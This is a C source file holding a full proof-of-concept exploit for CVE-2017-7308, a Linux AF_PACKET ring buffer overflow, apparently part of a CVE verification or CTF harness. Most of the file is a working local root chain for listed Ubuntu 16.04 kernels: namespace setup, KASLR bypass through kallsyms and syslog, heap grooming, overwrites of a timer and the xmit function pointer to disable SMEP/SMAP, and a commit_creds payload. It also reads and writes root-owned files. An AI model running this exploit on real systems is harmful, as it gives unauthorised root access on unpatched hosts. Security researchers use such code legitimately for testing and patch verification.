/**
 * CVE-2017-7308 PoC - AF_PACKET TPACKET_V3 Ring Buffer OOB Write → LPE
 *
 * Vulnerability mechanism:
 *   packet_set_ring() uses signed integer arithmetic for sizeof_priv calculation.
 *   Crafted tp_sizeof_priv causes integer overflow, resulting in undersized ring
 *   buffer allocation. Subsequent packet reception writes OOB past the buffer,
 *   corrupting adjacent kernel objects (timer_list or xmit function pointer).
 *   Attacker chains: OOB write → overwrite timer/xmit → ROP → commit_creds(0) → LPE
 *
 * Exploitation flow:
 *   1. unshare(CLONE_NEWUSER|CLONE_NEWNET) for CAP_NET_RAW
 *   2. KASLR bypass via /proc/kallsyms or syslog
 *   3. Heap grooming: pad kmalloc-4096 and page allocator
 *   4. oob_setup(): create AF_PACKET socket with crafted sizeof_priv
 *   5. oob_write(): send loopback packet → OOB write past ring buffer
 *   6. Overwrite timer_list → native_write_cr4(val) disables SMEP/SMAP
 *   7. Overwrite xmit → execute get_root_payload in userspace
 *   8. commit_creds(prepare_kernel_cred(0)) → root
 *
 * Affected kernel versions: 4.0.0 ~ 4.10.6 (Ubuntu 16.04: 4.8.0-34 ~ 4.8.0-45)
 *
 * Reference: https://github.com/bcoles/kernel-exploits/blob/master/CVE-2017-7308/poc.c
 *
 * Safety constraints:
 * - alarm(10) forced timeout (via poc_common.h)
 * - Does not modify system files
 * - Namespace-isolated execution
 */

#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <stdint.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/utsname.h>
#include <sys/klog.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <netinet/if_ether.h>
#include <pthread.h>

#include "../common/poc_common.h"

#define CVE_ID "CVE-2017-7308"
#define MAX_FILE_SIZE 4096

/* ========================================================================
 * Kernel version offsets for commit_creds / prepare_kernel_cred / native_write_cr4
 * ======================================================================== */

struct kernel_offsets {
    const char *version;
    uint64_t commit_creds;
    uint64_t prepare_kernel_cred;
    uint64_t native_write_cr4;
};

static struct kernel_offsets known_kernels[] = {
    { "4.8.0-34-generic #36~16.04.1-Ubuntu", 0xa5d50, 0xa6140, 0x64210 },
    { "4.8.0-36-generic #36~16.04.1-Ubuntu", 0xa5d50, 0xa6140, 0x64210 },
    { "4.8.0-39-generic #42~16.04.1-Ubuntu", 0xa5cf0, 0xa60e0, 0x64210 },
    { "4.8.0-41-generic #44~16.04.1-Ubuntu", 0xa5cf0, 0xa60e0, 0x64210 },
    { "4.8.0-42-generic #45~16.04.1-Ubuntu", 0xa5cf0, 0xa60e0, 0x64210 },
    { "4.8.0-44-generic #47~16.04.1-Ubuntu", 0xa5cf0, 0xa60e0, 0x64210 },
    { "4.8.0-45-generic #48~16.04.1-Ubuntu", 0xa5cf0, 0xa60e0, 0x64210 },
    { "4.8.0-34-lowlatency #36~16.04.1-Ubuntu", 0xa6ed0, 0xa72e0, 0x64910 },
    { "4.8.0-36-lowlatency #36~16.04.1-Ubuntu", 0xa6ed0, 0xa72e0, 0x64910 },
    { "4.8.0-39-lowlatency #42~16.04.1-Ubuntu", 0xa6ec0, 0xa72d0, 0x64910 },
    { "4.8.0-42-lowlatency #45~16.04.1-Ubuntu", 0xa6ec0, 0xa72d0, 0x64910 },
    { "4.8.0-44-lowlatency #47~16.04.1-Ubuntu", 0xa6ec0, 0xa72d0, 0x64910 },
    { "4.8.0-45-lowlatency #48~16.04.1-Ubuntu", 0xa6ec0, 0xa72d0, 0x64910 },
};

#define NUM_KERNELS (sizeof(known_kernels) / sizeof(known_kernels[0]))

/* ========================================================================
 * Exploit constants
 * ======================================================================== */

#define KERNEL_BASE_DEFAULT  0xffffffff81000000ul
#define KERNEL_BASE_MIN      0xffffffff00000000ul
#define KERNEL_BASE_MAX      0xffffffffff000000ul

#define KMALLOC_PAD          512
#define PAGEALLOC_PAD        1024

/* packet_sock->rx_ring->prb_bdqc->retire_blk_timer */
#define TIMER_OFFSET         896
/* packet_sock->xmit */
#define XMIT_OFFSET          1304

#define V3_ALIGNMENT         8
#define BLK_HDR_LEN          (((sizeof(struct tpacket_block_desc)) + V3_ALIGNMENT - 1) & ~(V3_ALIGNMENT - 1))

/* ========================================================================
 * Global state
 * ======================================================================== */

static int g_kernel_idx = -1;
static unsigned long g_kernel_base = KERNEL_BASE_DEFAULT;
static unsigned long g_cr4_value = 0x406e0ul;
static int g_got_root = 0;

/* ========================================================================
 * Helper: write content to a procfs/sysfs file
 * ======================================================================== */
static int write_to_file(const char *path, const char *fmt, ...) {
    char buf[256];
    va_list args;
    va_start(args, fmt);
    vsnprintf(buf, sizeof(buf), fmt, args);
    va_end(args);

    int fd = open(path, O_WRONLY | O_CLOEXEC);
    if (fd < 0) return 0;
    int len = (int)strlen(buf);
    int rv = (write(fd, buf, len) == len) ? 1 : 0;
    close(fd);
    return rv;
}

/* ========================================================================
 * Namespace sandbox setup
 * ======================================================================== */
static int setup_namespace_sandbox(void) {
    int real_uid = getuid();
    int real_gid = getgid();

    if (unshare(CLONE_NEWUSER) != 0) {
        poc_log("unshare(CLONE_NEWUSER) failed: %s", strerror(errno));
        return -1;
    }
    poc_log_syscall("unshare(CLONE_NEWUSER)", 0, 0);

    if (unshare(CLONE_NEWNET) != 0) {
        poc_log("unshare(CLONE_NEWNET) failed: %s", strerror(errno));
        return -1;
    }
    poc_log_syscall("unshare(CLONE_NEWNET)", 0, 0);

    if (!write_to_file("/proc/self/setgroups", "deny")) {
        poc_log("write /proc/self/setgroups failed");
        return -1;
    }
    if (!write_to_file("/proc/self/uid_map", "0 %d 1\n", real_uid)) {
        poc_log("write /proc/self/uid_map failed");
        return -1;
    }
    if (!write_to_file("/proc/self/gid_map", "0 %d 1\n", real_gid)) {
        poc_log("write /proc/self/gid_map failed");
        return -1;
    }

    /* Pin to CPU 0 for reliable exploitation */
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(0, &cpuset);
    sched_setaffinity(0, sizeof(cpuset), &cpuset);

    return 0;
}

/* ========================================================================
 * Kernel version detection
 * ======================================================================== */
static int detect_kernel_version(void) {
    struct utsname u;
    if (uname(&u) != 0) return -1;

    /* Must be 64-bit */
    if (strstr(u.machine, "64") == NULL) {
        poc_log("Not a 64-bit kernel: %s", u.machine);
        return -1;
    }

    /* Build version string in format: "4.8.0-45-lowlatency #48~16.04.1-Ubuntu" */
    char *ver_token = strtok(u.version, " ");
    char kernel_version[512];
    snprintf(kernel_version, sizeof(kernel_version), "%s %s", u.release, ver_token ? ver_token : "");

    for (unsigned i = 0; i < NUM_KERNELS; i++) {
        if (strcmp(kernel_version, known_kernels[i].version) == 0) {
            poc_log("Matched kernel: %s", known_kernels[i].version);
            return (int)i;
        }
    }

    poc_log("Kernel version '%s' not in target list", kernel_version);
    return -1;
}

/* ========================================================================
 * KASLR bypass via /proc/kallsyms
 * ======================================================================== */
static unsigned long kaslr_bypass_kallsyms(void) {
    FILE *f = fopen("/proc/kallsyms", "r");
    if (!f) return 0;

    unsigned long addr = 0;
    char dummy;
    char sname[256];

    while (fscanf(f, "%lx %c %255s", &addr, &dummy, sname) == 3) {
        if (strcmp(sname, "startup_64") == 0) {
            fclose(f);
            if (addr > KERNEL_BASE_MIN && addr < KERNEL_BASE_MAX)
                return addr;
            return 0;
        }
    }

    fclose(f);
    return 0;
}

/* ========================================================================
 * KASLR bypass via syslog (Ubuntu Xenial)
 * ======================================================================== */
static unsigned long kaslr_bypass_syslog(void) {
    int size = klogctl(10, NULL, 0); /* SYSLOG_ACTION_SIZE_BUFFER */
    if (size <= 0) return 0;

    size = ((size / 4096) + 1) * 4096;
    char *buf = (char *)mmap(NULL, size, PROT_READ | PROT_WRITE,
                             MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (buf == MAP_FAILED) return 0;

    int actual = klogctl(3, buf, size); /* SYSLOG_ACTION_READ_ALL */
    if (actual <= 0) {
        munmap(buf, size);
        return 0;
    }

    /* Search for "Freeing SMP" line containing kernel address */
    char *needle = memmem(buf, actual, "Freeing SMP", 11);
    if (!needle) {
        munmap(buf, size);
        return 0;
    }

    /* Find "ffff" hex address in that line */
    int line_len = 0;
    while (needle[line_len] && needle[line_len] != '\n') line_len++;

    char *hex = memmem(needle, line_len, "ffff", 4);
    if (!hex) {
        munmap(buf, size);
        return 0;
    }

    unsigned long addr = strtoul(hex, NULL, 16);
    munmap(buf, size);

    addr &= 0xfffffffffff00000ul;
    addr -= 0x1000000ul;

    if (addr > KERNEL_BASE_MIN && addr < KERNEL_BASE_MAX)
        return addr;

    return 0;
}

/* ========================================================================
 * Combined KASLR bypass
 * ======================================================================== */
static unsigned long get_kernel_base(void) {
    unsigned long addr;

    poc_log("Attempting KASLR bypass via /proc/kallsyms");
    addr = kaslr_bypass_kallsyms();
    if (addr) {
        poc_log("KASLR bypass success (kallsyms): 0x%lx", addr);
        return addr;
    }

    poc_log("Attempting KASLR bypass via syslog");
    addr = kaslr_bypass_syslog();
    if (addr) {
        poc_log("KASLR bypass success (syslog): 0x%lx", addr);
        return addr;
    }

    poc_log("KASLR bypass failed, using default base 0x%lx", KERNEL_BASE_DEFAULT);
    return KERNEL_BASE_DEFAULT;
}

/* ========================================================================
 * AF_PACKET ring buffer setup (core vulnerability trigger)
 * ======================================================================== */
static void packet_socket_rx_ring_init(int s, unsigned int block_size,
                                        unsigned int frame_size, unsigned int block_nr,
                                        unsigned int sizeof_priv, unsigned int timeout) {
    int v = TPACKET_V3;
    int rv = setsockopt(s, SOL_PACKET, PACKET_VERSION, &v, sizeof(v));
    if (rv < 0) {
        poc_log("setsockopt(PACKET_VERSION): %s", strerror(errno));
        return;
    }

    struct tpacket_req3 req;
    memset(&req, 0, sizeof(req));
    req.tp_block_size = block_size;
    req.tp_frame_size = frame_size;
    req.tp_block_nr = block_nr;
    req.tp_frame_nr = (block_size * block_nr) / frame_size;
    req.tp_retire_blk_tov = timeout;
    req.tp_sizeof_priv = sizeof_priv;
    req.tp_feature_req_word = 0;

    rv = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req));
    int saved_errno = errno;
    poc_log_syscall("setsockopt(PACKET_RX_RING)", rv, saved_errno);
}

static int packet_socket_setup(unsigned int block_size, unsigned int frame_size,
                               unsigned int block_nr, unsigned int sizeof_priv,
                               int timeout) {
    int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    int saved_errno = errno;
    poc_log_syscall("socket(AF_PACKET, SOCK_RAW, ETH_P_ALL)", s, saved_errno);
    if (s < 0) return -1;

    packet_socket_rx_ring_init(s, block_size, frame_size, block_nr,
                               sizeof_priv, timeout);

    struct sockaddr_ll sa;
    memset(&sa, 0, sizeof(sa));
    sa.sll_family = PF_PACKET;
    sa.sll_protocol = htons(ETH_P_ALL);
    sa.sll_ifindex = if_nametoindex("lo");
    sa.sll_hatype = 0;
    sa.sll_pkttype = 0;
    sa.sll_halen = 0;

    int rv = bind(s, (struct sockaddr *)&sa, sizeof(sa));
    saved_errno = errno;
    poc_log_syscall("bind(AF_PACKET, lo)", rv, saved_errno);

    return s;
}

/* ========================================================================
 * OOB write primitives
 * ======================================================================== */

/**
 * oob_setup: Create AF_PACKET socket with crafted sizeof_priv
 * that causes integer overflow in ring buffer size calculation.
 * The overflow results in OOB write at specified offset past the buffer.
 */
static int oob_setup(int offset) {
    unsigned int maclen = ETH_HLEN;
    unsigned int netoff = ((TPACKET3_HDRLEN + ((maclen < 16) ? 16 : maclen) +
                           V3_ALIGNMENT - 1) & ~(V3_ALIGNMENT - 1));
    unsigned int macoff = netoff - maclen;

    /* Core vulnerability: crafted sizeof_priv causes integer overflow */
    unsigned int sizeof_priv = (1u << 31) + (1u << 30) +
                               0x8000 - BLK_HDR_LEN - macoff + offset;

    poc_log("oob_setup: sizeof_priv=0x%x offset=%d", sizeof_priv, offset);
    return packet_socket_setup(0x8000, 2048, 2, sizeof_priv, 100);
}

static void loopback_send(char *buffer, int size) {
    int s = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
    if (s < 0) return;

    struct sockaddr_ll sa;
    memset(&sa, 0, sizeof(sa));
    sa.sll_ifindex = if_nametoindex("lo");
    sa.sll_halen = ETH_ALEN;

    sendto(s, buffer, size, 0, (struct sockaddr *)&sa, sizeof(sa));
    close(s);
}

static void oob_write(char *buffer, int size) {
    loopback_send(buffer, size);
}

/* ========================================================================
 * Heap padding (stabilize slab layout for reliable OOB)
 * ======================================================================== */
static int g_kmalloc_fds[KMALLOC_PAD];
static int g_pagealloc_fds[PAGEALLOC_PAD];

static void kmalloc_pad(int count) {
    for (int i = 0; i < count; i++) {
        g_kmalloc_fds[i] = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
    }
}

static void pagealloc_pad(int count) {
    for (int i = 0; i < count; i++) {
        g_pagealloc_fds[i] = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
        if (g_pagealloc_fds[i] >= 0) {
            /* Schedule timer to allocate pages */
            packet_socket_rx_ring_init(g_pagealloc_fds[i], 0x1000, 0x1000, 1, 0, 100);
        }
    }
}

/* ========================================================================
 * Kernel function pointer structures (for OOB overwrite targets)
 * ======================================================================== */

typedef uint32_t u32;

struct hlist_node_k {
    struct hlist_node_k *next;
    struct hlist_node_k **pprev;
};

struct timer_list_k {
    struct hlist_node_k entry;       /* 0-15 */
    unsigned long expires;            /* 16 */
    void (*function)(unsigned long);  /* 24 — target for overwrite */
    unsigned long data;               /* 32 */
    u32 flags;                        /* 40 */
    int start_pid;                    /* 44 */
    void *start_site;                 /* 48 */
    char start_comm[16];              /* 56 */
};

/* ========================================================================
 * Get root payload (called via corrupted function pointer)
 * ======================================================================== */
typedef void (*commit_creds_fn)(void *);
typedef void *(*prepare_kernel_cred_fn)(void *);

static void get_root_payload(void) {
    commit_creds_fn cc = (commit_creds_fn)(g_kernel_base +
                          known_kernels[g_kernel_idx].commit_creds);
    prepare_kernel_cred_fn pkc = (prepare_kernel_cred_fn)(g_kernel_base +
                                  known_kernels[g_kernel_idx].prepare_kernel_cred);
    cc(pkc(NULL));
    g_got_root = 1;
}

/* ========================================================================
 * OOB exploitation primitives
 * ======================================================================== */

/**
 * Use OOB write to overwrite adjacent timer_list function pointer.
 * Timer fires after timeout → calls native_write_cr4(val) to disable SMEP/SMAP.
 */
static void oob_timer_execute(void *func, unsigned long arg) {
    int sock = oob_setup(2048 + TIMER_OFFSET - 8);
    if (sock < 0) return;

    /* Create victim timer objects adjacent to our ring buffer */
    int timers[32];
    for (int i = 0; i < 32; i++) {
        timers[i] = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
        if (timers[i] >= 0)
            packet_socket_rx_ring_init(timers[i], 0x1000, 0x1000, 1, 0, 1000);
    }

    /* Craft OOB payload to overwrite timer_list */
    char buffer[2048];
    memset(buffer, 0, sizeof(buffer));

    struct timer_list_k *timer = (struct timer_list_k *)&buffer[8];
    timer->function = func;
    timer->data = arg;
    timer->flags = 1;

    oob_write(buffer + 2, sizeof(struct timer_list_k) + 8 - 2);

    /* Wait for timer to fire */
    usleep(500000);

    for (int i = 0; i < 32; i++) {
        if (timers[i] >= 0) close(timers[i]);
    }
    close(sock);
}

/**
 * Use OOB write to overwrite packet_sock->xmit function pointer.
 * Next sendto() on that socket calls our payload.
 */
static void oob_xmit_execute(void *func) {
    int sock = oob_setup(2048 + XMIT_OFFSET - 64);
    if (sock < 0) return;

    int ps[32];
    for (int i = 0; i < 32; i++)
        ps[i] = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));

    /* Craft OOB payload to overwrite xmit */
    char buffer[2048];
    memset(buffer, 0, sizeof(buffer));

    void **xmit = (void **)&buffer[64];
    *xmit = func;

    oob_write(buffer + 2, 2048 - 2);

    /* Trigger xmit call by sending a packet */
    usleep(200000);
    for (int i = 0; i < 32; i++) {
        if (ps[i] >= 0) {
            struct sockaddr_ll sa;
            memset(&sa, 0, sizeof(sa));
            sa.sll_ifindex = if_nametoindex("lo");
            sa.sll_halen = ETH_ALEN;
            char pkt[64] = {0};
            sendto(ps[i], pkt, sizeof(pkt), 0, (struct sockaddr *)&sa, sizeof(sa));
        }
    }

    usleep(200000);
    for (int i = 0; i < 32; i++) {
        if (ps[i] >= 0) close(ps[i]);
    }
    close(sock);
}

/* ========================================================================
 * Core exploitation logic
 * ======================================================================== */
static int attempt_exploit(void) {
    poc_log("=== Phase 1: Namespace sandbox ===");
    if (setup_namespace_sandbox() != 0) {
        poc_log("Namespace sandbox setup failed");
        printf("%s Cannot create user/network namespace\n", POC_STEP_FAIL);
        return 0;
    }
    printf("%s Namespace sandbox created\n", POC_STEP_PASS);

    poc_log("=== Phase 2: Kernel version detection ===");
    g_kernel_idx = detect_kernel_version();
    if (g_kernel_idx < 0) {
        printf("%s Kernel version not in vulnerable target list\n", POC_STEP_INFO);
        printf("%s This exploit requires Ubuntu 16.04 kernel 4.8.0-34 ~ 4.8.0-45\n", POC_STEP_INFO);
        return 0;
    }
    printf("%s Matched vulnerable kernel: %s\n", POC_STEP_PASS,
           known_kernels[g_kernel_idx].version);

    poc_log("=== Phase 3: KASLR bypass ===");
    g_kernel_base = get_kernel_base();
    printf("%s Kernel base: 0x%lx\n", POC_STEP_PASS, g_kernel_base);
    printf("%s commit_creds: 0x%lx\n", POC_STEP_INFO,
           g_kernel_base + known_kernels[g_kernel_idx].commit_creds);
    printf("%s prepare_kernel_cred: 0x%lx\n", POC_STEP_INFO,
           g_kernel_base + known_kernels[g_kernel_idx].prepare_kernel_cred);

    poc_log("=== Phase 4: Heap grooming ===");
    kmalloc_pad(KMALLOC_PAD);
    pagealloc_pad(PAGEALLOC_PAD);
    printf("%s Heap padded (kmalloc=%d, pagealloc=%d)\n", POC_STEP_PASS,
           KMALLOC_PAD, PAGEALLOC_PAD);

    poc_log("=== Phase 5: SMEP/SMAP bypass via OOB timer overwrite ===");
    unsigned long native_write_cr4_addr = g_kernel_base +
                                          known_kernels[g_kernel_idx].native_write_cr4;
    poc_log("native_write_cr4: 0x%lx, cr4_value: 0x%lx",
            native_write_cr4_addr, g_cr4_value);
    oob_timer_execute((void *)native_write_cr4_addr, g_cr4_value);
    printf("%s SMEP/SMAP bypass attempted\n", POC_STEP_PASS);

    poc_log("=== Phase 6: Execute root payload via OOB xmit overwrite ===");
    oob_xmit_execute((void *)&get_root_payload);
    printf("%s Root payload executed\n", POC_STEP_PASS);

    poc_log("=== Phase 7: Verify privileges ===");
    if (g_got_root || getuid() == 0) {
        printf("%s Got root! uid=%d euid=%d\n", POC_STEP_PASS, getuid(), geteuid());
        return 1;
    }

    /* Check if we can access /etc/shadow (running in namespace, uid may show 0) */
    int fd = open("/etc/shadow", O_RDONLY);
    if (fd >= 0) {
        close(fd);
        printf("%s Got root! (verified via /etc/shadow access)\n", POC_STEP_PASS);
        return 1;
    }

    printf("%s Exploitation did not achieve root\n", POC_STEP_FAIL);
    return 0;
}

/* ========================================================================
 * Vulnerability path reachability check (non-destructive)
 * ======================================================================== */
static int check_vuln_path_reachable(void) {
    int exploitable = 0;

    /* Check 1: Can we create AF_PACKET socket? */
    int sock_fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    int saved_errno = errno;
    poc_log_syscall("socket(AF_PACKET, SOCK_RAW)", sock_fd, saved_errno);

    if (sock_fd < 0) {
        printf("%s socket(AF_PACKET): %s (need CAP_NET_RAW)\n",
               POC_STEP_FAIL, strerror(saved_errno));
        return 0;
    }
    printf("%s AF_PACKET socket created: fd=%d\n", POC_STEP_PASS, sock_fd);

    /* Check 2: Can we set TPACKET_V3? */
    int version = TPACKET_V3;
    int ret = setsockopt(sock_fd, SOL_PACKET, PACKET_VERSION, &version, sizeof(version));
    saved_errno = errno;
    poc_log_syscall("setsockopt(PACKET_VERSION=V3)", ret, saved_errno);

    if (ret < 0) {
        printf("%s TPACKET_V3 not available: %s\n", POC_STEP_FAIL, strerror(saved_errno));
        close(sock_fd);
        return 0;
    }
    printf("%s TPACKET_V3 supported\n", POC_STEP_PASS);

    /* Check 3: Test if overflow params are accepted (indicates missing bounds check) */
    struct tpacket_req3 req;
    memset(&req, 0, sizeof(req));
    req.tp_block_size = 0x8000;
    req.tp_frame_size = 2048;
    req.tp_block_nr = 2;
    req.tp_frame_nr = (0x8000 * 2) / 2048;
    req.tp_retire_blk_tov = 100;
    /* Crafted sizeof_priv: triggers integer overflow on vulnerable kernels */
    req.tp_sizeof_priv = (1u << 31) + (1u << 30) + 0x8000 - BLK_HDR_LEN;
    req.tp_feature_req_word = 0;

    ret = setsockopt(sock_fd, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req));
    saved_errno = errno;
    poc_log_syscall("setsockopt(PACKET_RX_RING, overflow sizeof_priv)", ret, saved_errno);

    if (ret == 0) {
        printf("%s Overflow sizeof_priv accepted — kernel lacks bounds check!\n", POC_STEP_PASS);
        printf("%s Ring buffer OOB write vector confirmed\n", POC_STEP_PASS);
        exploitable = 1;
    } else {
        printf("%s Overflow sizeof_priv rejected (EINVAL) — kernel has bounds check\n",
               POC_STEP_INFO);
        printf("%s Kernel appears patched against CVE-2017-7308\n", POC_STEP_INFO);
    }

    close(sock_fd);
    return exploitable;
}

/* ========================================================================
 * CTF mode: write_root_file
 * ======================================================================== */
static int mode_write_root_file(const poc_args_t *args) {
    char read_buf[MAX_FILE_SIZE] = {0};
    int fd;
    ssize_t n;

    /* Step 1: Read original file content */
    fd = open(args->root_file, O_RDONLY);
    if (fd < 0) {
        poc_print_fail("Cannot open root file for reading");
        return 1;
    }
    n = read(fd, read_buf, sizeof(read_buf) - 1);
    close(fd);
    if (n < 0) {
        poc_print_fail("Cannot read root file");
        return 1;
    }
    read_buf[n] = '\0';

    /* Trim trailing whitespace */
    while (n > 0 && (read_buf[n - 1] == '\n' || read_buf[n - 1] == '\r'))
        read_buf[--n] = '\0';

    printf("CTF_READ_BEFORE:%s\n", read_buf);
    poc_log("CTF_READ_BEFORE:%s", read_buf);

    /* Step 2: Attempt exploitation */
    printf("CTF_WRITE:%s (attempting...)\n", args->write_value);
    poc_log("CTF_WRITE:%s (attempting...)", args->write_value);

    int got_root = attempt_exploit();

    if (!got_root) {
        /* Check if path is reachable (for detection purposes) */
        int reachable = check_vuln_path_reachable();
        if (reachable) {
            poc_print_fail("OOB vector exists but full exploit chain failed (kernel may be partially patched)");
        } else {
            poc_print_fail("Vulnerability path not reachable on this kernel");
        }
        return 1;
    }

    /* Step 3: Write CTF value using root privileges */
    char write_buf[MAX_FILE_SIZE];
    int wlen = snprintf(write_buf, sizeof(write_buf), "%s\n", args->write_value);

    fd = open(args->root_file, O_WRONLY | O_TRUNC);
    if (fd < 0) {
        poc_print_fail("Cannot open root file for write even after exploit");
        return 1;
    }
    write(fd, write_buf, wlen);
    close(fd);

    /* Step 4: Verify write */
    memset(read_buf, 0, sizeof(read_buf));
    fd = open(args->root_file, O_RDONLY);
    if (fd < 0) {
        poc_print_fail("Cannot reopen root file for verification");
        return 1;
    }
    n = read(fd, read_buf, sizeof(read_buf) - 1);
    close(fd);
    read_buf[n > 0 ? n : 0] = '\0';

    while (n > 0 && (read_buf[n - 1] == '\n' || read_buf[n - 1] == '\r'))
        read_buf[--n] = '\0';

    printf("CTF_READ_AFTER:%s\n", read_buf);
    poc_log("CTF_READ_AFTER:%s", read_buf);

    if (strstr(read_buf, args->write_value) != NULL) {
        poc_print_flag(args->write_value);
        return 0;
    } else {
        poc_print_fail("Write verification failed");
        return 1;
    }
}

/* ========================================================================
 * CTF mode: read_root_file
 * ======================================================================== */
static int mode_read_root_file(const poc_args_t *args) {
    /* Attempt exploitation first */
    int got_root = attempt_exploit();
    if (!got_root) {
        poc_print_fail("Exploitation failed - cannot read privileged file");
        return 1;
    }

    /* Read the root-owned file with elevated privileges */
    char read_buf[MAX_FILE_SIZE] = {0};
    int fd = open(args->root_file, O_RDONLY);
    if (fd < 0) {
        poc_print_fail("Cannot open root file even after exploit");
        return 1;
    }
    ssize_t n = read(fd, read_buf, sizeof(read_buf) - 1);
    close(fd);

    if (n <= 0) {
        poc_print_fail("Cannot read root file content");
        return 1;
    }
    read_buf[n] = '\0';

    while (n > 0 && (read_buf[n - 1] == '\n' || read_buf[n - 1] == '\r'))
        read_buf[--n] = '\0';

    poc_print_flag(read_buf);
    return 0;
}

/* ========================================================================
 * Legacy mode (no CTF args): vulnerability detection only
 * ======================================================================== */
static int mode_legacy(void) {
    printf("=== %s PoC Verification ===\n", CVE_ID);
    printf("Target: AF_PACKET TPACKET_V3 ring buffer sizeof_priv overflow\n");
    printf("Method: OOB write → overwrite timer/xmit → ROP → LPE\n\n");

    poc_print_system_info();

    printf("\n--- Vulnerability Path Check ---\n");
    int result = check_vuln_path_reachable();

    printf("\n%s\n", POC_EVIDENCE_END);

    if (result) {
    } else {
    }

    return result ? 0 : 1;
}

/* ========================================================================
 * Main entry point
 * ======================================================================== */
int main(int argc, char *argv[]) {
    poc_args_t args;
    memset(&args, 0, sizeof(args));

    if (poc_parse_args(argc, argv, &args) != 0) {
        return 1;
    }

    /* Initialize logging */
    poc_log_init(args.log_file);
    poc_log("=== %s CTF PoC ===", CVE_ID);

    int ret;

    /* CTF mode dispatch */
    /* CTF mode is required */
    if (!args.mode) {
        fprintf(stderr, "Error: --mode is required (read_root_file|write_root_file|uaf)\n");
        poc_print_usage(argv[0]);
        poc_log_close();
        return 1;
    }

    if (strcmp(args.mode, POC_MODE_WRITE) == 0) {
        poc_log("Mode: write_root_file");
        poc_log("Target: %s", args.root_file);
        poc_log("Write value: %s", args.write_value);
        ret = mode_write_root_file(&args);
    } else if (strcmp(args.mode, POC_MODE_READ) == 0) {
        poc_log("Mode: read_root_file");
        poc_log("Target: %s", args.root_file);
        ret = mode_read_root_file(&args);
    } else {
        poc_print_unsupported(args.mode, "CVE-2017-7308 supports write_root_file and read_root_file modes");
        ret = 1;
    }

    poc_log_close();
    return ret;
}
